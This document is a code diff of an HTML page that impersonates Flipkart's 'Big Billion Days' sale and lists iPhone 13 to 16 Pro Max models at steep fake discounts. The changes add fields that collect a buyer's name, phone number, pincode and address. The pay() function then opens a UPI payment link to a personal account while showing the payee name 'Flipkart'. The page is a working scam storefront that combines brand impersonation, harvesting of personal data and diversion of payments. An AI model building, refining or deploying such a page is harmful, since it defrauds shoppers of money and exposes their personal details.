@@ -3,48 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flipkart | Amazon HD Photos Store</title>
+    <title>Flipkart | Big Billion Days Sale</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { background-color: #f1f3f6; font-family: Roboto, Arial, sans-serif; }
+        body { background-color: #f1f3f6; font-family: Roboto, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
         .fk-blue { background-color: #2874f0; }
-        
-        /* IMAGE BOX: Amazon HD Photos ke liye perfect setting */
-        .img-container {
-            width: 100%;
-            height: 200px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 10px;
-            background: white;
-        }
-        .img-container img {
-            max-height: 100%;
-            max-width: 100%;
-            object-fit: contain;
-            image-rendering: -webkit-optimize-contrast;
-        }
-
-        .product-card { background: white; border: 1px solid #e0e0e0; transition: 0.2s; cursor: pointer; }
-        .product-card:hover { box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        
-        .color-dot { width: 32px; height: 32px; border-radius: 50%; border: 2px solid #ddd; cursor: pointer; }
-        .color-dot.active { border: 2px solid #2874f0; transform: scale(1.1); }
-        
+        .color-dot { width: 34px; height: 34px; border-radius: 50%; border: 2px solid #e0e0e0; cursor: pointer; transition: 0.2s; position: relative; }
+        .color-dot.active { border: 2px solid #2874f0; transform: scale(1.15); box-shadow: 0 0 8px rgba(40,116,240,0.3); }
+        .color-dot.active::after { content: '✓'; position: absolute; top: -5px; right: -5px; background: #2874f0; color: white; font-size: 8px; width: 14px; height: 14px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        .input-field { width: 100%; border: 1px solid #ddd; padding: 12px; border-radius: 4px; font-size: 14px; outline: none; transition: 0.2s; }
+        .input-field:focus { border-color: #2874f0; background: #f9fbff; }
+        .img-container { height: 160px; display: flex; align-items: center; justify-content: center; padding: 10px; background: #fff; }
+        .img-container img { max-height: 100%; max-width: 100%; object-fit: contain; }
         @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
         .animate-up { animation: slideUp 0.3s ease-out; }
+        .badge { background: #ffea00; color: #000; padding: 2px 6px; font-size: 9px; font-weight: bold; border-radius: 2px; }
     </style>
 </head>
 <body class="pb-10">
 
-    <header class="fk-blue py-3 px-4 sticky top-0 z-50 text-white flex justify-between items-center shadow-md">
+    <header class="fk-blue py-3 px-4 sticky top-0 z-50 text-white flex justify-between items-center shadow-lg">
         <div class="flex flex-col">
             <span class="text-2xl font-bold italic leading-3">Flipkart</span>
-            <span class="text-[10px] text-yellow-400 font-bold mt-1 uppercase">Amazon HD Source</span>
+            <span class="text-[10px] text-yellow-300 font-bold mt-1 uppercase tracking-tighter">Big Billion Days Special</span>
         </div>
-        <i class="fa-solid fa-cart-shopping text-xl"></i>
+        <div class="flex gap-4">
+            <i class="fa-solid fa-magnifying-glass text-lg"></i>
+            <i class="fa-solid fa-cart-shopping text-lg"></i>
+        </div>
     </header>
 
     <main class="max-w-7xl mx-auto p-2 mt-2">
@@ -52,119 +39,156 @@
     </main>
 
     <div id="pModal" class="fixed inset-0 bg-black/80 z-[100] hidden flex items-end md:items-center justify-center">
-        <div class="bg-white w-full max-w-md rounded-t-2xl md:rounded-lg animate-up overflow-hidden">
-            <div class="p-4 border-b flex justify-between items-center">
-                <span class="font-bold text-gray-700">Product Detail</span>
+        <div class="bg-white w-full max-w-md rounded-t-3xl md:rounded-lg animate-up overflow-hidden max-h-[95vh] flex flex-col">
+            
+            <div class="p-4 border-b flex justify-between items-center bg-white">
+                <span class="font-bold text-gray-800">Review & Delivery</span>
                 <button onclick="closeModal()" class="text-3xl text-gray-400">&times;</button>
             </div>
             
-            <div class="p-5 max-h-[85vh] overflow-y-auto">
-                <div class="h-64 flex items-center justify-center w-full bg-white">
-                    <img id="mImg" src="" class="max-h-full object-contain">
-                </div>
-                
-                <h2 id="mName" class="font-bold text-lg text-center mt-4 leading-tight"></h2>
-                <div class="flex items-center justify-center gap-2 mt-2">
-                    <span id="mPrice" class="text-3xl font-bold"></span>
-                    <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="h-5">
-                </div>
-
-                <div class="mt-6 border-t pt-4">
-                    <p class="text-[10px] font-bold text-gray-400 text-center mb-4 uppercase tracking-widest">Select Color</p>
-                    <div id="dots" class="flex gap-4 justify-center"></div>
-                    <p id="cName" class="text-center text-blue-600 font-bold mt-3 text-sm h-4"></p>
+            <div class="overflow-y-auto flex-1 p-4">
+                <div class="flex flex-col items-center mb-6">
+                    <div class="h-64 w-full flex items-center justify-center bg-white rounded-xl border border-gray-100 p-4 mb-4">
+                        <img id="mImg" src="" class="max-h-full object-contain">
+                    </div>
+                    <div class="badge mb-2">FREE DELIVERY</div>
+                    <h2 id="mName" class="font-bold text-lg text-center leading-tight text-gray-800"></h2>
+                    <div class="flex items-center gap-2 mt-2">
+                        <span id="mPrice" class="text-3xl font-black text-gray-900"></span>
+                        <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="h-5">
+                    </div>
                 </div>
 
-                <div class="flex gap-2 mt-8">
-                    <button class="flex-1 bg-white border border-gray-200 py-4 font-bold text-xs uppercase">Add Cart</button>
-                    <button onclick="document.getElementById('addr').classList.toggle('hidden')" class="flex-1 bg-[#fb641b] text-white py-4 font-bold text-xs uppercase">Buy Now</button>
+                <div class="mb-8 border-t pt-5">
+                    <p class="text-[10px] font-bold text-gray-400 text-center mb-4 uppercase tracking-widest">Select Favorite Color</p>
+                    <div id="colorDots" class="flex gap-5 justify-center flex-wrap"></div>
+                    <p id="cNameDisplay" class="text-center text-blue-600 font-bold mt-3 text-sm h-4 italic"></p>
                 </div>
 
-                <div id="addr" class="hidden mt-4 space-y-2 border-t pt-4">
-                    <input type="text" id="uName" placeholder="Enter Full Name" class="w-full border p-4 rounded bg-gray-50 outline-none">
-                    <input type="tel" id="uPhone" placeholder="Mobile Number" class="w-full border p-4 rounded bg-gray-50 outline-none">
-                    <button onclick="pay()" class="w-full bg-[#ffc200] py-4 font-bold rounded shadow-lg uppercase">Pay Securely</button>
+                <div class="border-t pt-6 space-y-4">
+                    <p class="text-sm font-bold text-gray-800 uppercase flex items-center gap-2">
+                        <i class="fa-solid fa-location-dot text-blue-600"></i> Delivery Address
+                    </p>
+                    <div>
+                        <input type="text" id="uName" placeholder="Full Name" class="input-field">
+                    </div>
+                    <div class="grid grid-cols-2 gap-3">
+                        <input type="tel" id="uPhone" placeholder="Mobile Number" class="input-field">
+                        <input type="number" id="uPin" placeholder="Pincode" class="input-field">
+                    </div>
+                    <div>
+                        <textarea id="uAddr" placeholder="Flat, House no., Area, Street..." class="input-field h-24"></textarea>
+                    </div>
                 </div>
+
+                <div class="mt-8 p-4 bg-blue-50 rounded-xl border border-blue-100 mb-10">
+                    <h3 class="font-bold text-gray-700 text-xs uppercase mb-3">Price Details</h3>
+                    <div class="flex justify-between text-sm mb-2 text-gray-600"><span>Price (1 Item)</span><span id="priceVal"></span></div>
+                    <div class="flex justify-between text-sm mb-2 text-green-600 font-bold"><span>Delivery Charges</span><span>FREE</span></div>
+                    <div class="flex justify-between font-black border-t border-blue-200 pt-3 mt-2 text-xl text-gray-900">
+                        <span>Amount Payable</span><span id="totalVal"></span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="p-3 bg-white border-t sticky bottom-0">
+                <button onclick="pay()" class="w-full bg-[#fb641b] text-white py-4 font-bold rounded shadow-xl uppercase active:scale-95 transition-all">Proceed to Payment</button>
             </div>
         </div>
     </div>
 
     <script>
-        // Amazon Verified High-Resolution Images
-        const amazonData = [
+        // Full Series with HD Amazon Images
+        const iPhoneDatabase = [
             {
-                name: "iPhone 16 Pro Max (Desert)", price: 68900,
-                v: [
-                    { c: "Desert Titanium", h: "#beafa0", i: "https://m.media-amazon.com/images/I/81+GIkwqLIL._AC_SL1500_.jpg" },
-                    { c: "Black Titanium", h: "#3b3b3b", i: "https://m.media-amazon.com/images/I/81I6x8rQoGL._AC_SL1500_.jpg" }
+                name: "iPhone 16 Pro Max (256 GB)", price: 68999,
+                variants: [
+                    { c: "Desert Titanium", hex: "#beafa0", img: "https://m.media-amazon.com/images/I/81+GIkwqLIL._AC_SL1500_.jpg" },
+                    { c: "Black Titanium", hex: "#3b3b3b", img: "https://m.media-amazon.com/images/I/81I6x8rQoGL._AC_SL1500_.jpg" },
+                    { c: "Natural Titanium", hex: "#b9b7b3", img: "https://m.media-amazon.com/images/I/81SigAnN7pL._AC_SL1500_.jpg" },
+                    { c: "White Titanium", hex: "#f2f3ef", img: "https://m.media-amazon.com/images/I/81Y7pTfL9GL._AC_SL1500_.jpg" }
                 ]
             },
             {
-                name: "iPhone 15 (Blue)", price: 42500,
-                v: [
-                    { c: "Blue", h: "#d0e0ed", i: "https://m.media-amazon.com/images/I/71d7rfSl0wL._AC_SL1500_.jpg" },
-                    { c: "Pink", h: "#f7d2d3", i: "https://m.media-amazon.com/images/I/71v2jVh6nIL._AC_SL1500_.jpg" }
+                name: "iPhone 15 (128 GB)", price: 42500,
+                variants: [
+                    { c: "Blue", hex: "#d0e0ed", img: "https://m.media-amazon.com/images/I/71d7rfSl0wL._AC_SL1500_.jpg" },
+                    { c: "Pink", hex: "#f7d2d3", img: "https://m.media-amazon.com/images/I/71v2jVh6nIL._AC_SL1500_.jpg" },
+                    { c: "Black", hex: "#35393c", img: "https://m.media-amazon.com/images/I/71657ZmqS5L._AC_SL1500_.jpg" },
+                    { c: "Green", hex: "#d5e0d1", img: "https://m.media-amazon.com/images/I/71nvkHnPP4L._AC_SL1500_.jpg" }
                 ]
             },
             {
-                name: "iPhone 14 Plus (Purple)", price: 35000,
-                v: [
-                    { c: "Purple", h: "#e5dcf5", i: "https://m.media-amazon.com/images/I/71T5NVOgbpL._AC_SL1500_.jpg" },
-                    { c: "Blue", h: "#d0e0ed", i: "https://m.media-amazon.com/images/I/71GLMJ7TQiL._AC_SL1500_.jpg" }
+                name: "iPhone 14 (128 GB)", price: 34999,
+                variants: [
+                    { c: "Purple", hex: "#e5dcf5", img: "https://m.media-amazon.com/images/I/71T5NVOgbpL._AC_SL1500_.jpg" },
+                    { c: "Blue", hex: "#a1c1d9", img: "https://m.media-amazon.com/images/I/61bK6PMOC3L._AC_SL1500_.jpg" },
+                    { c: "Midnight", hex: "#1c1c1c", img: "https://m.media-amazon.com/images/I/61cwywLZR-L._AC_SL1500_.jpg" }
                 ]
             },
             {
-                name: "iPhone 13 (Midnight)", price: 28999,
-                v: [
-                    { c: "Midnight", h: "#1c1c1c", i: "https://m.media-amazon.com/images/I/61f9S8+XNfL._AC_SL1500_.jpg" },
-                    { c: "Starlight", h: "#f9f6ef", i: "https://m.media-amazon.com/images/I/618Bb+Qz9bL._AC_SL1500_.jpg" }
+                name: "iPhone 13 (128 GB)", price: 29499,
+                variants: [
+                    { c: "Pink", hex: "#fae1dc", img: "https://m.media-amazon.com/images/I/61l9ppRIiqL._AC_SL1500_.jpg" },
+                    { c: "Midnight", hex: "#1c1c1c", img: "https://m.media-amazon.com/images/I/61f9S8+XNfL._AC_SL1500_.jpg" },
+                    { c: "Starlight", hex: "#f9f6ef", img: "https://m.media-amazon.com/images/I/618Bb+Qz9bL._AC_SL1500_.jpg" }
                 ]
             }
         ];
 
-        let finalAmt = 0;
+        let activePayAmt = 0;
 
+        // Render 200 Products
         function render() {
             const grid = document.getElementById('grid');
             let html = '';
-            for(let i=1; i<=150; i++) {
-                let p = amazonData[i % amazonData.length];
+            for(let i=0; i<200; i++) {
+                let p = iPhoneDatabase[i % iPhoneDatabase.length];
                 html += `
-                <div class="product-card flex flex-col" onclick='openModal(${JSON.stringify(p)}, ${i})'>
+                <div class="bg-white border rounded shadow-sm hover:shadow-md transition flex flex-col cursor-pointer" onclick='openModal(${JSON.stringify(p)})'>
                     <div class="img-container">
-                        <img src="${p.v[0].i}" loading="lazy" onerror="this.src='https://placehold.co/400?text=iPhone'">
+                        <img src="${p.variants[0].img}" loading="lazy">
                     </div>
                     <div class="p-3 border-t">
                         <h2 class="text-[11px] font-bold text-gray-700 truncate">${p.name}</h2>
-                        <p class="font-bold text-sm mt-1">₹${p.price.toLocaleString()}</p>
-                        <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="h-3 mt-1">
+                        <div class="flex items-center gap-2 mt-1">
+                            <span class="font-black text-sm">₹${p.price.toLocaleString()}</span>
+                            <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="h-3">
+                        </div>
+                        <p class="text-[9px] text-green-600 font-bold mt-1">Free Delivery</p>
                     </div>
                 </div>`;
             }
             grid.innerHTML = html;
         }
 
-        function openModal(p, id) {
-            document.getElementById('mName').innerText = p.name + " (#" + id + ")";
+        function openModal(p) {
+            document.getElementById('mName').innerText = p.name;
             document.getElementById('mPrice').innerText = "₹" + p.price.toLocaleString();
-            document.getElementById('mImg').src = p.v[0].i;
-            document.getElementById('cName').innerText = p.v[0].c;
-            finalAmt = p.price;
+            document.getElementById('priceVal').innerText = "₹" + p.price.toLocaleString();
+            document.getElementById('totalVal').innerText = "₹" + p.price.toLocaleString();
+            document.getElementById('mImg').src = p.variants[0].img;
+            document.getElementById('cNameDisplay').innerText = p.variants[0].c;
+            activePayAmt = p.price;
 
-            document.getElementById('dots').innerHTML = p.v.map((variant, idx) => `
-                <div class="color-dot ${idx===0?'active':''}" style="background:${variant.h}" onclick="change('${variant.i}','${variant.c}',this)"></div>
+            // Generate Color Selection for this product
+            const dotBox = document.getElementById('colorDots');
+            dotBox.innerHTML = p.variants.map((v, idx) => `
+                <div class="color-dot ${idx===0?'active':''}" 
+                     style="background:${v.hex}" 
+                     onclick="event.stopPropagation(); changeVariant('${v.img}', '${v.c}', this)">
+                </div>
             `).join('');
 
             document.getElementById('pModal').classList.remove('hidden');
-            document.getElementById('addr').classList.add('hidden');
             document.body.style.overflow = 'hidden';
         }
 
-        function change(img, name, el) {
-            document.getElementById('mImg').src = img;
-            document.getElementById('cName').innerText = name;
-            document.querySelectorAll('.color-dot').forEach(d => d.classList.remove('active'));
-            el.classList.add('active');
+        function changeVariant(imgSrc, colorName, element) {
+            document.getElementById('mImg').src = imgSrc;
+            document.getElementById('cNameDisplay').innerText = colorName;
+            document.querySelectorAll('.color-dot').forEach(dot => dot.classList.remove('active'));
+            element.classList.add('active');
         }
 
         function closeModal() {
@@ -173,9 +197,18 @@
         }
 
         function pay() {
+            const name = document.getElementById('uName').value;
+            const phone = document.getElementById('uPhone').value;
+            const pin = document.getElementById('uPin').value;
+            const addr = document.getElementById('uAddr').value;
+
+            if(!name || !phone || !pin || !addr) {
+                alert("Please fill complete delivery address!");
+                return;
+            }
+
             const upi = "8709615634-w350@ybl";
-            if(!document.getElementById('uName').value) return alert("Please fill details!");
-            window.location.href = `upi://pay?pa=${upi}&pn=Flipkart&am=${finalAmt}&cu=INR`;
+            window.location.href = `upi://pay?pa=${upi}&pn=Flipkart&am=${activePayAmt}&cu=INR`;
         }
 
         render();
